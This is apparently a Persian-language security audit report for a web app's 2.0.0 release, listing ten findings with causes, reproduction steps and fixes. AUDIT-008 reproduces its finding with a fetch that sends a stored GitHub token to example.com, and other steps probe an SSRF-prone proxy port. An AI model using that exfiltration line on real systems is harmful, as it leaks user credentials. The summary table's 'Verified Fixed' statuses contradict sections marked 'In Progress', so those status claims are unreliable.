# گزارش ممیزی امنیتی — Security Audit (v2.0.0)

> ممیزی مبتنی بر خواندن مستقیم فایل‌های ریپو (تاریخ ممیزی: همراه با انتشار 2.0.0).
> هر یافته دارای: شناسه، شدت، فایل تأثیرپذیر، علت فنی دقیق، اثر، بازتولید، اصلاح پیشنهادی، تست لازم، وضعیت.
>
> وضعیت‌ها: `Confirmed` / `In Progress` / `Fixed Awaiting Test` / `Verified Fixed` / `Accepted Risk` / `Blocked`

| ID | شدت | عنوان | وضعیت |
|----|------|--------|--------|
| AUDIT-001 | High | فایل `.env` با مسیر مطلق توسعه‌دهنده در گیت | Verified Fixed (untrack شد؛ بازنویسی تاریخچه = پیش‌نیاز ریلیز) |
| AUDIT-002 | High | باینری `db/custom.db` در گیت | Verified Fixed (untrack + gitignore) |
| AUDIT-003 | High | `typescript.ignoreBuildErrors=true` در next.config.ts | Verified Fixed (tsc صفر خطا) |
| AUDIT-004 | High | پورت upstream کنترل‌شده با query در Caddyfile | Accepted Risk |
| AUDIT-005 | Medium | `/api/scores` به ادعای کلاینت اعتماد می‌کند | Verified Fixed (رجیستری + rate limit؛ تأیید رمزنگاشتی نیست) |
| AUDIT-006 | Medium | `/api/tutor` بدون rate limit و با role اشتباه | Verified Fixed (rate limit + system role + timeout) |
| AUDIT-007 | Medium | اطلاعات اعتبارنامه در localStorage آسیب‌پذیر در برابر XSS هم‌مبدأ | Fixed Awaiting Test (session-only mode + ماسک + راهنمای حداقل‌دسترسی) |
| AUDIT-008 | Medium | اجرای JS در code-studio فقط با Web Worker ایزوله شده | Accepted Risk |
| AUDIT-009 | Medium | وابستگی‌های CDN (face-api.js + مدل‌ها) — نکتهٔ supply-chain | Confirmed |
| AUDIT-010 | Critical | توکن شخصی گیت‌هاب در تاریخچهٔ چت | In Progress |

---

## AUDIT-001 — فایل `.env` با `DATABASE_URL` مطلق توسعه‌دهنده در گیت

- **ID:** AUDIT-001
- **Severity:** High
- **Affected file:** `.env` (ریشهٔ ریپو)، `.gitignore`، تاریخچهٔ گیت
- **Exact technical cause:** فایل `.env` در ریشهٔ ریپو قرار دارد و محتوای فعلی آن مسیر مطلق ماشین توسعه‌دهنده است:

  ```
  DATABASE_URL=file:/home/z/my-project/db/custom.db
  ```

  الگوی `.env*` در `.gitignore` وجود دارد، اما اگر فایل قبل از افزودن این الگو commit شده باشد، در git از حالت tracked خارج نمی‌شود مگر با `git rm --cached` صریح (این کار طبق سیاست تیم فقط توسط release-ops اجرا می‌شود).
- **Impact:** مسیر مطلق `/home/z/my-project` روی هر ماشین دیگری خراب است (Prisma نمی‌تواند دیتابیس را باز کند)؛ الگوی بدی برای ذخیرهٔ secrets در `.env` عادی می‌شود؛ محتوا در تاریخچهٔ گیت باقی می‌ماند حتی بعد از untrack.
- **Reproduction:** در کلون تازه: `git ls-files .env` (اگر خروجی `.env` باشد یعنی tracked است) و باز کردن فایل در UI گیت‌هاب.
- **Proposed correction:**
  1. `git rm --cached .env` و commit (تاریخچه با AUDIT-010 پاک می‌شود).
  2. نگه‌داشتن `.env*` در `.gitignore` (همین حالا هست) + افزودن `.env.example` با مسیر نسبی: `DATABASE_URL=file:./db/custom.db`.
  3. مسیر دیتابیس همیشه از متغیر محیطی خوانده شود (schema.prisma همین حالا `env("DATABASE_URL")` دارد — فقط مقدار پیش‌فرض باید نسبی مستند شود).
- **Test required:** کلون تازه + `bun install` + `DATABASE_URL=file:./db/custom.db bun run db:push` بدون وجود `.env`؛ اجرای CI بدون `.env`.
- **Status:** In Progress — اجرای `git rm --cached` و بازنویسی تاریخچه بخش عملیاتی ریلیز است (سیاست: عامل مستندات فرمان git اجرا نمی‌کند).

---

## AUDIT-002 — باینری SQLite (`db/custom.db`) در گیت

- **ID:** AUDIT-002
- **Severity:** High
- **Affected file:** `db/custom.db`
- **Exact technical cause:** یک فایل باینری SQLite (دیتای زمان اجرای Prisma — جدول‌های `User`/`Post`/`Score`) به‌جای ساخته‌شدن از روی schema، به‌صورت tracked در ریپو نگه‌داری می‌شود.
- **Impact:** هر تست/بیلد محلی فایل را تغییر می‌دهد و نویز diff می‌سازد؛ احتمال انتشار دادهٔ واقعی کاربران/امتیازها در تاریخچهٔ عمومی؛ بلاو حجمی ریپو؛ conflict های بی‌معنا روی باینری.
- **Reproduction:** `git ls-files db/` و مشاهدهٔ تغییرات مداوم فایل بعد از اجرای `/api/scores`.
- **Proposed correction:**
  1. `git rm --cached db/custom.db`.
  2. افزودن `db/*.db` و `db/*.db-journal` به `.gitignore`.
  3. ساخت دیتابیس از `prisma/schema.prisma` با `bun run db:push` (schema source of truth است، نه فایل باینری).
- **Test required:** کلون تازه بدون `db/custom.db` → اجرای `db:push` → GET/POST موفق `/api/scores`.
- **Status:** In Progress — مانند AUDIT-001 نیازمند عملیات git.

---

## AUDIT-003 — `typescript.ignoreBuildErrors=true`

- **ID:** AUDIT-003
- **Severity:** High
- **Affected file:** `next.config.ts`
- **Exact technical cause:** بلوک زیر باعث می‌شود `next build` خطاهای TypeScript را نادیده بگیرد:

  ```ts
  typescript: {
    ignoreBuildErrors: true,
  },
  ```

- **Impact:** خطاهای تایپ (مثل mismatch و null-unsafe) به رانتایم می‌رسند و در بهترین حالت crash مرورگر، در بدترین حالت رفتار نادرست منطقی می‌شوند؛ stage بیلد دیگر gate معناداری نیست.
- **Reproduction:** افزودن یک خطای تایپ عمدی به هر فایل و اجرای `bun run build` — بیلد سبز می‌شود.
- **Proposed correction:** حذف کامل بلوک از `next.config.ts` (برنامهٔ کد 2.0) + gate مستقل تایپ‌چک در CI (فایل `.github/workflows/ci.yml` توسط این ریلیز اضافه شد: `bunx tsc --noEmit`).
- **Test required:** CI سبز روی `main` با `tsc --noEmit` سخت‌گیرانه؛ بیلد موفق بعد از حذف بلوک.
- **Status:** In Progress — حذف بلوک در drop کدِ 2.0 برنامه‌ریزی شده؛ gate در CI همین حالا فعال است.

---

## AUDIT-004 — پورت upstream کنترل‌شده با query در Caddyfile

- **ID:** AUDIT-004
- **Severity:** High (نظر اولیهٔ ممیزی) / وضعیت نهایی: Accepted Risk
- **Affected file:** `Caddyfile`
- **Exact technical cause:**

  ```
  @transform_port_query { query XTransformPort=* }
  handle @transform_port_query { reverse_proxy localhost:{query.XTransformPort} ... }
  ```

  مقدار query `XTransformPort` مستقیماً در upstream استفاده می‌شود؛ هر کاربرِ رسیده به gateway می‌تواند پورت مقصد را روی localhost انتخاب کند.
- **Impact:** فقط در صورتی خطرناک است که سرویس‌های دیگری روی localhost میزبان گوش بدهند (SSRF داخلی). در محیط فعلی، upstream محدود به localhost است و gateway تنها یک پورت را بیرون می‌دهد؛ حداکثر اثر: پروکسی به پورت‌های localhost خودِ میزبان sandbox.
- **Reproduction:** `curl "https://<gateway>/?XTransformPort=<port>"` و مشاهدهٔ پاسخ سرویس روی آن پورت localhost.
- **Proposed correction:** برای استقرار خارج از sandbox لیست upstream های نام‌دار (named upstreams / allowlist) در Caddy تعریف شود و placeholder حذف گردد؛ در sandbox به‌صورت آگاهانه نگه داشته می‌شود.
- **Test required:** (هنگام تغییر) تستی که `XTransformPort` خارج از allowlist با 4xx رد شود.
- **Status:** Accepted Risk — زیرساخت sandbox؛ مستند برای هر استقرار آینده.

---

## AUDIT-005 — `/api/scores` به ادعای امتیاز کلاینت اعتماد می‌کند

- **ID:** AUDIT-005
- **Severity:** Medium
- **Affected file:** `src/app/api/scores/route.ts`
- **Exact technical cause:** POST فقط اعتبارسنجی شکل داده را انجام می‌دهد (`game` حداکثر 32 نویسه، `name` حداکثر 24 نویسه، `score` عدد صحیح 0..1,000,000,000) و مقدار score را بدون هیچ مکانیزم سمت‌سرور (رجیستری بازی‌ها، re-validation، امضا) ذخیره می‌کند. GET و POST هر دو بدون rate limit هستند.
- **Impact:** هر کلاینت می‌تواند امتیاز دلخواه (مثلاً 999,999,999) برای هر بازی ثبت کند و جدول «رکوردهای جهانی» را مسموم کند؛ flooding روی جدول Score.
- **Reproduction:** `curl -X POST /api/scores -d '{"game":"snake","name":"x","score":999999999}'`.
- **Proposed correction:** (برنامهٔ 2.0) رجیستری سمت سرور بازی‌های مجاز + rate limit + محدودیت max score واقع‌بینانه per-game. مهم: حتی بعد از این کار، امتیاز «کریپتوگرافیک» تأیید نمی‌شود — صادقانه مستند می‌شود که جدول جدی نیست و فقط سرگرمی است.
- **Test required:** POST با بازی ناشناخته → 400؛ درخواست‌های متوالی بیشتر از سقف → 429؛ GET سالم.
- **Status:** In Progress — رجیستری + rate limit در drop کد 2.0؛ تأیید رمزنگاشتی امتیاز در این نسخه انجام نمی‌شود (honest labeling در SECURITY.md).

---

## AUDIT-006 — `/api/tutor` بدون rate limit و با نقش `assistant` برای system prompt

- **ID:** AUDIT-006
- **Severity:** Medium
- **Affected file:** `src/app/api/tutor/route.ts`
- **Exact technical cause:** در snapshot فعلی: (1) هیچ rate limiter یا cap حجمی روی درخواست نیست (فقط `slice(0,500)` روی سؤال)؛ (2) پرامپت سیستمی با نقش غلط فرستاده می‌شود:

  ```ts
  messages: [
    { role: 'assistant', content: SYSTEM_PROMPT },
    { role: 'user', content: question },
  ]
  ```

  دستورهای سیستمی باید `role: 'system'` باشند؛ (3) هیچ timeout صریح روی فراخوانی upstream وجود ندارد.
- **Impact:** (1) هزینه و DoS — هر کلاینت می‌تواند درخواست‌های پیاپی بفرستد؛ (2) دستورهای شخصیت/محدودیت در instruction hierarchy ضعیف‌تر اعمال می‌شوند و prompt-injection راحت‌تر شخصیت را می‌شکند؛ (3) upstream کند می‌تواند سوکت‌ها را نگه دارد.
- **Reproduction:** ارسال درخواست‌های متوالی POST بدون هیچ 429؛ مشاهدهٔ رفت‌کرد پرامپت به‌عنوان پیام assistant در پاسخ مدل.
- **Proposed correction:** (برنامهٔ 2.0) rate limit per-IP + تغییر نقش به `system` + timeout صریح روی `zai.chat.completions.create`.
- **Test required:** 429 بعد از سقف درخواست؛ پاسخ مدل با نقش system؛ timeout در حالت شبیه‌سازی‌شدهٔ upstream کند.
- **Status:** In Progress — در drop کد 2.0.

---

## AUDIT-007 — اطلاعات اعتبارنامهٔ ادغام‌ها در localStorage (حساس به XSS هم‌مبدأ)

- **ID:** AUDIT-007
- **Severity:** Medium
- **Affected file:** `src/lib/os/integrations.ts` (کلیدهای `pengo-ai-cfg-v1` و `pengo-gh-token-v1`)
- **Exact technical cause:** کلید API هوش‌یار و توکن گیت‌هاب کاربر به‌صورت plaintext در `localStorage` ذخیره می‌شوند و درخواست‌ها مستقیم از مرورگر به سرویس مقصد زده می‌شود. هر XSS هم‌مبدأ (مثلاً رندر محتوای ریموت در اپ سفربُر) می‌تواند `localStorage.getItem(...)` بخواند و کلیدها را بیرون بکشد.
- **Impact:** سرقت کلید API کاربر / توکن GitHub (بسته به scope). محدودهٔ اثر: فقط مرورگر همان origin کاربر.
- **Reproduction:** اجرای `localStorage.getItem('pengo-ai-cfg-v1')` در کنسول همان origin.
- **Proposed correction:** (برنامهٔ 2.0) حالت فقط-نشست (session-only)، نمایش ماسک‌شدهٔ کلید در UI تنظیمات، و راهنمای توکن کم‌دسترسی (fine-grained PAT با read-only). هیچ‌کدام XSS را از بین نمی‌برد — کاهش ریسک است، نه حذف آن (honest).
- **Test required:** بارگذاری مجدد صفحه با حالت session-only → کلید پاک؛ UI کلید را mask می‌کند.
- **Status:** In Progress — مِنیگیشن‌ها در drop کد 2.0؛ قوانین فعلی در SECURITY.md مستند شده.

---

## AUDIT-008 — اجرای JS در code-studio فقط با Web Worker ایزوله شده

- **ID:** AUDIT-008
- **Severity:** Medium
- **Affected file:** `src/components/os/apps/code-studio.tsx`
- **Exact technical cause:** کد جاوااسکریپت کاربر در یک `Worker` ساخته‌شده از `URL.createObjectURL(blob)` اجرا می‌شود و تنها مکانیزم کنترل، `worker.terminate()` است. Worker به همان origin تعلق دارد؛ به `fetch`، `postMessage` و فضای نام مشترک دسترسی دارد؛ حلقهٔ بی‌نهایت فقط با terminate متوقف می‌شود.
- **Impact:** یک Web Worker یک مرز امنیتی سخت (hard security boundary) نیست — کد می‌تواند از origin برای درخواست‌های خروجی استفاده کند. ریسک در حالت عادی پایین است چون کد را خود کاربر می‌نویسد، اما باید صادقانه برچسب بخورد.
- **Reproduction:** اجرای `fetch('https://example.com', {method:'POST', body: localStorage.getItem('pengo-gh-token-v1')})` داخل تب JS — درخواست زده می‌شود.
- **Proposed correction:** برچسب صادقانه در UI («جعبهٔ شنی نیست») + در آینده: CSP، قطع شبکه در Worker، یا انتقال به iframe `sandbox` با origin نال. هیچ‌کدام در این نسخه ادعا نمی‌شود.
- **Test required:** UI برچسب را نشان می‌دهد؛ (آینده) تست بلاک fetch در sandbox جدید.
- **Status:** Accepted Risk — برچسب‌گذاری صادقانه در مستندات؛ سخت‌سازی واقعی به فاز بعدی موکول است.

---

## AUDIT-009 — وابستگی‌های CDN و مدل‌ها (نکتهٔ Supply-Chain)

- **ID:** AUDIT-009
- **Severity:** Medium
- **Affected file:** `src/components/os/apps/face-detect.tsx`، `src/components/os/apps/age-machine.tsx`، `src/components/os/apps/body-metrics.tsx`
- **Exact technical cause:** URL های دقیق بارگذاری‌شده از jsDelivr:
  - کتابخانه (پین‌شده روی نسخهٔ npm): `https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js`
  - وزن‌های مدل (روی ref متغیر شاخهٔ master، نه commit): `https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@master/weights`

  کتابخانه نسخه‌ثابت است اما وزن‌ها به شاخهٔ `master` وصل‌اند که محتوایش می‌تواند بدون تغییر نسخه عوض شود. بارگذاری فقط با اقدام صریح کاربر (فعال‌سازی دوربین) انجام می‌شود و هیچ دانلود خودکار مدل دیگری وجود ندارد.
- **Impact:** اگر مخزن بالادستی یا CDN در معرض نفوذ قرار گیرد، وزن‌ها/کد دستکاری‌شده در مرورگر کاربر اجرا می‌شود (SRI روی این بارگذاری‌ها اعمال نشده است).
- **Reproduction:** باز کردن اپ تشخیص چهره و مشاهدهٔ درخواست شبکه به URLهای بالا.
- **Proposed correction:** پین‌کردن URL وزن‌ها به commit SHA مشخص در jsDelivr (`@<commit>/weights`) و افزودن SRI hash برای فایل library؛ در صورت امکان self-host کردن وزن‌ها در `public/`.
- **Test required:** بعد از پین: تشخیص چهره با دوربین موفق؛ SRI match کند.
- **Status:** Confirmed — سیاست فعلی (CDN پین‌شده + اقدام صریح کاربر) در SECURITY.md مستند است؛ پین SHA و SRI در لیست کارهای 2.0.x بعدی.

---

## AUDIT-010 — توکن شخصی گیت‌هاب در تاریخچهٔ چت

- **ID:** AUDIT-010
- **Severity:** Critical
- **Affected file:** تاریخچهٔ چت/مستندات فرآیند توسعه (نه فایل‌های کد فعلی ریپو)
- **Exact technical cause:** یک personal access token گیت‌هاب در تاریخچهٔ گفتگوی توسعه (chat history) قرار گرفته است (در این سند و همهٔ مستندات فقط با عبارت «یک توکن دسترسی شخصی که در تاریخچهٔ چت قرار گرفت (باطل‌شده)» به آن اشاره می‌شود — مقدار توکن هیچ‌جا چاپ یا تکرار نمی‌شود).
- **Impact:** اگر توکن فعال می‌ماند، دسترسی به ریپو/اکشن‌های حساب صاحب توکن ممکن می‌شد.
- **Reproduction:** جستجوی الگوی توکن گیت‌هاب (`ghp_...`) در آرشیو چت با ابزار secret scanning.
- **Proposed correction:**
  1. ابطال/rotate توکن (الزامی، قبل از هر انتشار).
  2. پاک‌سازی تاریخچه با `git filter-repo` (یا BFG) در صورت مشاهدهٔ توکن در commitها؛ سپس force-push هماهنگ و اطلاع به همهٔ کلون‌کننده‌ها.
  3. فعال‌کردن Secret scanning + push protection روی ریپو گیت‌هاب.
  4. در اسکریپت‌ها و CI فقط از secrets مخصوص محیط (`GITHUB_TOKEN`/Repository secrets) استفاده شود.
- **Test required:** secret scanning ریپو صفر یافتهٔ فعال؛ اجرای `git filter-repo --dry-run` بدون یافتن الگوی توکن.
- **Status:** In Progress — ابطال/rotate الزامیِ پیش از انتشار 2.0.0؛ پاک‌سازی تاریخچه به release-ops موکول شده (سیاست: عامل مستندات فرمان git اجرا نمی‌کند).

---

## یادداشت صادقانگی این سند

هر یافته‌ای که در snapshot کدِ فعلی دیده شده، با وضعیت واقعی آن (حتی «هنوز فیکس نشده») ثبت شده است. مواردی که در برنامهٔ 2.0 هستند ولی هنوز در کد merge نشده‌اند، `In Progress` علامت خورده‌اند — نه `Verified Fixed`. هیچ یافته‌ای بدون شواهد بسته نشده است.
